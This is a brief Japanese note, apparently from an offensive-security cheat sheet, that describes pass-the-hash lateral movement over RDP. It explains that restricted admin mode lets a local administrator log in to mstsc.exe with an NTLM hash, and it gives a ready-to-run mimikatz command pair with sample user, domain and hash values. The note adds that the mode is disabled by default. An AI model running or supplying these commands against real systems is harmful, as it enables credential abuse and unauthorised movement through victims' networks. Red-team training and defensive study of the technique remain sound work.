# Pass the hash
mstsc.exeはrestrictedadmin（制限付き管理者モード）を使用することで、ローカル管理者権限を持つユーザであればNTLMハッシュでログイン可能

接続元でmimikatzを実行してmstsc.exeにユーザ＋NTLMハッシュを入れることで、横移動可能
```
privilege::debug
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```


制限付き管理者モードはデフォルトでは有効になってない